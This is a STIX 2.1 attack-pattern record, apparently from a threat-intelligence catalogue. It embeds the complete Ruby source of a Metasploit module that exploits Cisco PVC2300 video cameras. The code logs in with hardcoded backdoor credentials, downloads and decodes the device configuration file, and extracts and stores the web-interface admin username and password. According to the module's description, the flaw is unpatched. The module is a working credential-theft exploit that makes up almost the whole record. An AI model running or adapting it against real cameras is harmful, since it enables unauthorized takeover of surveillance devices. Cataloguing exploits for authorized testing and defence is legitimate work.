{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--310e20a1-a374-47bd-801a-9b41f4584a5f",
    "created": "2024-08-14T16:32:31.744587Z",
    "modified": "2024-08-14T16:32:31.744591Z",
    "name": "Cisco PVC2300 POE Video Camera configuration download",
    "description": " This module exploits an information disclosure vulnerability in Cisco PVC2300 cameras in order to download the configuration file containing the admin credentials for the web interface.  The module first performs a basic check to see if the target is likely Cisco PVC2300. If so, the module attempts to obtain a sessionID via an HTTP GET request to the vulnerable /oamp/System.xml endpoint using hardcoded credentials.  If a session ID is obtained, the module uses it in another HTTP GET request to /oamp/System.xml with the aim of downloading the configuration file. The configuration file, if obtained, is then decoded and saved to the loot directory. Finally, the module attempts to extract the admin credentials to the web interface from the decoded configuration file. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/cisco_pvc2300_download_config.rb",
            "external_id": "cisco_pvc2300_download_config.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.youtube.com/watch?v=B8DjTcANBx0#fullblackhatpresentation"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Cisco PVC2300 POE Video Camera configuration download',\n          'Description' => %q{\n            This module exploits an information disclosure vulnerability in Cisco PVC2300 cameras in order\n            to download the configuration file containing the admin credentials for the web interface.\n\n            The module first performs a basic check to see if the target is likely Cisco PVC2300. If so, the\n            module attempts to obtain a sessionID via an HTTP GET request to the vulnerable /oamp/System.xml\n            endpoint using hardcoded credentials.\n\n            If a session ID is obtained, the module uses it in another HTTP GET request to /oamp/System.xml\n            with the aim of downloading the configuration file. The configuration file, if obtained, is then\n            decoded and saved to the loot directory. Finally, the module attempts to extract the admin\n            credentials to the web interface from the decoded configuration file.\n\n            No known solution was made available for this vulnerability and no CVE has been published. It is\n            therefore likely that most (if not all) Cisco PVC2300 cameras are affected.\n\n            This module was successfully tested against several Cisco PVC2300 cameras.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Craig Heffner', # vulnerability discovery and PoC\n            'Erik Wynter', # @wyntererik - Metasploit\n          ],\n          'References' => [\n            [ 'URL', 'https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2013/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-Slides.pdf' ], # blackhat presentation - unofficial source\n            [ 'URL', 'https://media.blackhat.com/us-13/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-Slides.pdf'], # blackhat presentation - official source (not working)\n            [ 'URL', 'https://www.youtube.com/watch?v=B8DjTcANBx0'] # full blackhat presentation\n          ],\n          'DisclosureDate' => '2013-07-12',\n          'Notes' => {\n            'Stability' => [CRASH_SAFE],\n            'Reliability' => [REPEATABLE_SESSION], # the attack can be repeated, but a timeout of several minutes may be necessary between exploit attempts\n            'SideEffects' => [IOC_IN_LOGS]\n          }\n        }\n      )\n    )\n  end\n\n  def custom_base64_alphabet\n    'ACEGIKMOQSUWYBDFHJLNPRTVXZacegikmoqsuwybdfhjlnprtvxz0246813579=+'\n  end\n\n  def default_base64_alphabet\n    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n  end\n\n  def request_session_id\n    vprint_status('Attempting to obtain a session ID')\n    # the creds used here are basically a backdoor\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'oamp', 'System.xml'),\n      'vars_get' => {\n        'action' => 'login',\n        'user' => 'L1_admin',\n        'password' => 'L1_51'\n      }\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection failed when trying to obtain a session ID')\n    end\n\n    unless res.code == 200\n      fail_with(Failure::NotVulnerable, \"Received unexpected response code #{res.code} while trying to obtain a session ID.\")\n    end\n\n    if res.headers.include?('sessionID') && !res.headers['sessionID'].blank?\n      session_id = res.headers['sessionID']\n      print_status(\"The target may be vulnerable. Obtained sessionID #{session_id}\")\n      return session_id\n    end\n\n    # try to check the status message in the response body\n    # the status may indicate if the target is perhaps only temporarily unavailable, which was encountered when testing the module repeatedly\n    status = res.body.scan(%r{<statusString>(.*?)</statusString>})&.flatten&.first&.strip\n    if status.blank?\n      fail_with(Failure::NotVulnerable, 'Failed to obtain a session ID.')\n    end\n\n    if status == 'try it later'\n      fail_with(Failure::Unknown, \"Failed to obtain a session ID. The server responded with status: #{status}. The target may still be vulnerable.\")\n    else\n      fail_with(Failure::NotVulnerable, \"Failed to obtain a session ID. The server responded with status: #{status}\")\n    end\n  end\n\n  def download_config_file(session_id)\n    vprint_status('Attempting to download the configuration file')\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'oamp', 'System.xml'),\n      'headers' => {\n        'sessionID' => session_id\n      },\n      'vars_get' => {\n        'action' => 'downloadConfigurationFile'\n      }\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection failed when trying to download the configuration file')\n    end\n\n    unless res.code == 200 && !res.body.empty?\n      fail_with(Failure::NotVulnerable, 'Failed to obtain the configuration file')\n    end\n\n    # if the exploit doesn't work, the response body should be empty. So if we have anything, we can assume we're in business\n    res.body\n  end\n\n  def decode_config_file(config_file_encoded)\n    # if we've made it all the way here, this shouldn't break, but better safe than sorry\n    begin\n      config_file_base64 = config_file_encoded.tr(custom_base64_alphabet, default_base64_alphabet)\n      config_file_decoded = Base64.decode64(config_file_base64)\n    rescue StandardError => e\n      print_error('Encountered the following error when attempting to decode the configuration file:')\n      print_error(e)\n      fail_with(Failure::Unknown, 'Failed to decode the configuration file')\n    end\n\n    # let's just save the full config at this point\n    path = store_loot('ciscopvc.config', 'text/plain', rhost, config_file_decoded)\n    print_good('Successfully downloaded the configuration file')\n    print_status(\"Saving the full configuration file to #{path}\")\n\n    # let's see if we can grab the device name from the config file\n    if config_file_decoded =~ /comment=.*? Video Camera/\n      device_name = config_file_decoded.scan(/comment=(.*?)$/)&.flatten&.first&.strip\n      unless device_name.blank?\n        print_status(\"Obtained device name #{device_name}\")\n      end\n    end\n\n    # try to grab the admin username and password from the config file\n    admin_name = nil\n    admin_password = nil\n    if config_file_decoded.include?('admin_name')\n      admin_name = config_file_decoded.scan(/admin_name=(.*?)$/)&.flatten&.first&.strip\n    end\n\n    if config_file_decoded.include?('admin_password')\n      admin_password = config_file_decoded.scan(/admin_password=(.*?)$/)&.flatten&.first&.strip\n    end\n\n    if admin_name.blank? && admin_password.blank?\n      print_error('Failed to obtain the admin credentials from the configuration file')\n    else\n      print_good('Obtained the following admin credentials for the web interface from the configuration file:')\n      print_status(\"admin username: #{admin_name}\")\n      print_status(\"admin password: #{admin_password}\")\n      # save the creds to the db\n      report_creds(admin_name, admin_password)\n    end\n  end\n\n  def report_creds(username, password)\n    service_data = {\n      address: datastore['RHOST'],\n      port: datastore['RPORT'],\n      service_name: 'http',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: fullname,\n      origin_type: :service,\n      private_data: password,\n      private_type: :password,\n      username: username\n    }.merge(service_data)\n\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n      core: credential_core,\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def check\n    res1 = send_request_cgi('uri' => normalize_uri(target_uri.path))\n\n    unless res1\n      return Exploit::CheckCode::Unknown('Target is unreachable.')\n    end\n\n    # string togetether a few checks to make it more likely we're dealing with a Cisco camera\n    unless res1.code == 401 && res1.headers.include?('WWW-Authenticate') && res1.headers['WWW-Authenticate'] == 'Basic realm=\"IP Camera\"'\n      return Exploit::CheckCode::Safe('Target is not a Cisco PVC2300 POE Video Camera')\n    end\n\n    res2 = send_request_cgi('uri' => normalize_uri(target_uri.path, 'oamp', 'System.xml'))\n    unless res2\n      return Exploit::CheckCode::Unknown('Target is unreachable.')\n    end\n\n    unless res2.code == 200 && res2.body =~ %r{<ActionStatus><statusCode>.*?</statusCode><statusString>.*?</statusString></ActionStatus>}\n      return Exploit::CheckCode::Safe('Target is not a Cisco PVC2300 POE Video Camera')\n    end\n\n    vprint_status('Target seems to be a Cisco camera')\n    Exploit::CheckCode::Appears\n  end\n\n  def run\n    session_id = request_session_id\n    config_file = download_config_file(session_id)\n    decode_config_file(config_file)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2013-07-12"
}